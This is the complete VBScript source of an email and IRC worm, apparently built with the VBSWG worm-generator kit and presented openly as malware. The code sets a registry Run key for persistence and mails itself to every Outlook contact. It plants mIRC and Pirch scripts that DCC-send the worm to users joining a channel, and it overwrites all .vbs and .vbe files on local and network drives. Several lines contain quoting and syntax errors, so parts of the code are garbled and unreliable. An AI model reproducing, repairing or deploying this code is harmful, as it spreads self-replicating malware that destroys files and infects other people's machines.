'Vbs.Worm.2001 Created By [A]XoR
On Error Resume Next
Set kHp71a483u2= Createobject("scripting.filesystemobject")
if not(kHp71a483u2.fileexists "c:") then
kHp71a483u2.createfolder "c:"
kHp71a483u2.copyfile wscript.scriptfullname,"c:\Worm.vbs"
Set YNpD3AVXiNg = CreateObject("WScript.Shell")
YNpD3AVXiNg.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Worm","wscript.exe c:\Worm.vbs %"
if YNpD3AVXiNg.regread ("HKCU\software\Worm.2001\mailed") <> "1" then
yO4LTJl78dW()
end if
if YNpD3AVXiNg.regread ("HKCU\software\Worm.2001\mirqued") <> "1" then
DD7hqnm5JE4 ""
end if
if YNpD3AVXiNg.regread ("HKCU\software\Worm.2001\pirched") <> "1" then
yHEeiuJrc5i ""
end if
b6tTP1MoJ3Z()
Set URHz23rBqlo= kHp71a483u2.opentextfile(wscript.scriptfullname, 1)
QUP7rzqW2U8= URHz23rBqlo.readall
URHz23rBqlo.Close
Do
If Not (kHp71a483u2.fileexists(wscript.scriptfullname)) Then
Set bwRHf3cTt4q= kHp71a483u2.createtextfile(wscript.scriptfullname, True)
bwRHf3cTt4q.writeQUP7rzqW2U8
bwRHf3cTt4q.Close
End If
Loop
Function yO4LTJl78dW()
On Error Resume Next
Set kiRp4dEkkzR = CreateObject("Outlook.Application")
If kiRp4dEkkzR= "Outlook"Then
Set gdfiChcZ4XE=kiRp4dEkkzR.GetNameSpace("MAPI")
Set KwamUkohG5F= gdfiChcZ4XE.AddressLists
For Each j77KxYmGK33 In KwamUkohG5F
If j77KxYmGK33.AddressEntries.Count <> 0 Then
Go5B7ImhM0K = j77KxYmGK33.AddressEntries.Count
For UP3uH658r4C= 1 To Go5B7ImhM0K
Set ShTxILu73yA = kiRp4dEkkzR.CreateItem(0)
Set N6KLA4QjvWm = j77KxYmGK33.AddressEntries(UP3uH658r4C)
ShTxILu73yA.To = N6KLA4QjvWm.Address
ShTxILu73yA.Subject = "Here you have, ;o)"
ShTxILu73yA.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
set w632K8Q4w09=ShTxILu73yA.Attachments
w632K8Q4w09.Add "c:\Worm.vbs"
ShTxILu73yA.DeleteAfterSubmit = True
If ShTxILu73yA.To <> "" Then
ShTxILu73yA.Send
YNpD3AVXiNg.regwrite "HKCU\software\Worm.2001\mailed", "1"
End If
Next
End If
Next
end if
End Function
Function DD7hqnm5JE4(G4PwyN6LSIk)
On Error Resume Next
if G4PwyN6LSIk = "" then
if kHp71a483u2.fileexists("c:\mirc\mirc.ini") then G4PwyN6LSIk="c:\mirc"
if kHp71a483u2.fileexists("c:\mirc32\mirc.ini") then G4PwyN6LSIk="c:\mirc32"
G5u8BD9g9ml=YNpD3AVXiNg.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if kHp71a483u2.fileexists(G5u8BD9g9ml & "\mirc\mirc.ini") then G4PwyN6LSIk=G5u8BD9g9ml & "\mirc"
end if
if G4PwyN6LSIk <> "" then
set s3nQtN2CoS4 = kHp71a483u2.CreateTextFile(G4PwyN6LSIk & "\script.ini", True)
s3nQtN2CoS4.WriteLine "[script]"
s3nQtN2CoS4.writeline "n0=on 1:JOIN:#:{"
s3nQtN2CoS4.writeline "n1=  /if ( $nick == $me ) { halt }"
s3nQtN2CoS4.writeline "n2=  /." & chr(100) & chr(99) & chr(99) & " send $nick "&c:\Worm.vbs" & vbCrLf & "n3=}"
s3nQtN2CoS4.close
YNpD3AVXiNg.regwrite "HKCU\software\Worm.2001\Mirqued", "1"
end if
end function
function yHEeiuJrc5i(H5NzK7AVYsO)
On Error Resume Next
if H5NzK7AVYsO="" then
if kHp71a483u2.fileexists("c:\pirch\Pirch32.exe") then H5NzK7AVYsO="c:\pirch"
if kHp71a483u2.fileexists("c:\pirch32\Pirch32.exe") then H5NzK7AVYsO="c:\pirch32"
qXNxLT3b64t=YNpD3AVXiNg.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if kHp71a483u2.fileexists(qXNxLT3b64t & "\pirch\Pirch32.exe") then H5NzK7AVYsO=qXNxLT3b64t & "\pirch\Pirch32.exe"
end if
if H5NzK7AVYsO <> "" then
set fr4X9V28Fbz= kHp71a483u2.CreateTextFile(H5NzK7AVYsO & "\events.ini", True)
fr4X9V28Fbz.WriteLine "[Levels]"
fr4X9V28Fbz.WriteLine "Enabled=1"
fr4X9V28Fbz.WriteLine "Count=6"
fr4X9V28Fbz.WriteLine "Level1=000-Unknowns"
fr4X9V28Fbz.WriteLine "000-UnknownsEnabled=1"
fr4X9V28Fbz.WriteLine "Level2=100-Level 100"
fr4X9V28Fbz.WriteLine "100-Level 100Enabled=1"
fr4X9V28Fbz.WriteLine "Level3=200-Level 200"
fr4X9V28Fbz.WriteLine "200-Level 200Enabled=1"
fr4X9V28Fbz.WriteLine "Level4=300-Level 300"
fr4X9V28Fbz.WriteLine " 300-Level 300Enabled=1"
fr4X9V28Fbz.WriteLine "Level5=400-Level 400 "
fr4X9V28Fbz.WriteLine "400-Level 400Enabled=1"
fr4X9V28Fbz.WriteLine "Level6=500-Level 500"
fr4X9V28Fbz.WriteLine "500-Level 500Enabled=1"
fr4X9V28Fbz.WriteLine ""
fr4X9V28Fbz.WriteLine "[000-Unknowns]"
fr4X9V28Fbz.WriteLine "UserCount=0"
fr4X9V28Fbz.WriteLine "EventCount=0"
fr4X9V28Fbz.WriteLine ""
fr4X9V28Fbz.WriteLine "[100-Level 100]"
fr4X9V28Fbz.WriteLine "User1=*!*@*"
fr4X9V28Fbz.WriteLine "UserCount=1"
fr4X9V28Fbz.writeline "Event1=ON JOIN:#:/" & chr(100) & chr(99) & chr(99) & " tsend $nick " & c:\Worm.vbs"
fr4X9V28Fbz.WriteLine "EventCount=1"
fr4X9V28Fbz.WriteLine ""
fr4X9V28Fbz.WriteLine "[200-Level 200]"
fr4X9V28Fbz.WriteLine "UserCount=0"
fr4X9V28Fbz.WriteLine "EventCount=0"
fr4X9V28Fbz.WriteLine ""
fr4X9V28Fbz.WriteLine "[300-Level 300]"
fr4X9V28Fbz.WriteLine "UserCount=0"
fr4X9V28Fbz.WriteLine "EventCount=0"
fr4X9V28Fbz.WriteLine ""
fr4X9V28Fbz.WriteLine "[400-Level 400]"
fr4X9V28Fbz.WriteLine "UserCount=0"
fr4X9V28Fbz.WriteLine "EventCount=0"
fr4X9V28Fbz.WriteLine ""
fr4X9V28Fbz.WriteLine "[500-Level 500]"
fr4X9V28Fbz.WriteLine "UserCount=0"
fr4X9V28Fbz.WriteLine "EventCount=0"
fr4X9V28Fbz.close
YNpD3AVXiNg.regwrite "HKCU\software\Worm.2001\pirched", "1"
end if
end function
Function b6tTP1MoJ3Z()
On Error Resume Next
Set YYN9DKS8f2c = kHp71a483u2.Drives
For Each TlD2zhQo3cD In YYN9DKS8f2c
If TlD2zhQo3cD.Drivetype = Remote Then
QQY6FjeiBgi= TlD2zhQo3cD & "\"
Call YQusI7626Yl(QQY6FjeiBgi)
ElseIf TlD2zhQo3cD.IsReady Then
QQY6FjeiBgi= TlD2zhQo3cD&"\"
Call YQusI7626Yl(QQY6FjeiBgi)
End If
Next
End Function
Function YQusI7626Yl(NIIXOwhtTju)
INtwzIIQGh8=NIIXOwhtTju
Set P21y7O3t988= kHp71a483u2.GetFolder(INtwzIIQGh8)
Set LrLYADe81jM= P21y7O3t988.Files
For Each G0OrK1AlxG4 In LrLYADe81jM
if kHp71a483u2.GetExtensionName(G0OrK1AlxG4.path) = "vbs" then
kHp71a483u2.copyfile wscript.scriptfullname , G0OrK1AlxG4.path , true
end if
if kHp71a483u2.GetExtensionName(G0OrK1AlxG4.path) = "vbe" then
kHp71a483u2.copyfile wscript.scriptfullname , G0OrK1AlxG4.path , true
end if
Next
Set G0OrK1AlxG4= P21y7O3t988.SubFolders
For Each MLwI6YSV1LG In G0OrK1AlxG4
Call YQusI7626Yl(MLwI6YSV1LG.path)
Next
End Function
'Vbswg 1.5. [K]Alamar.
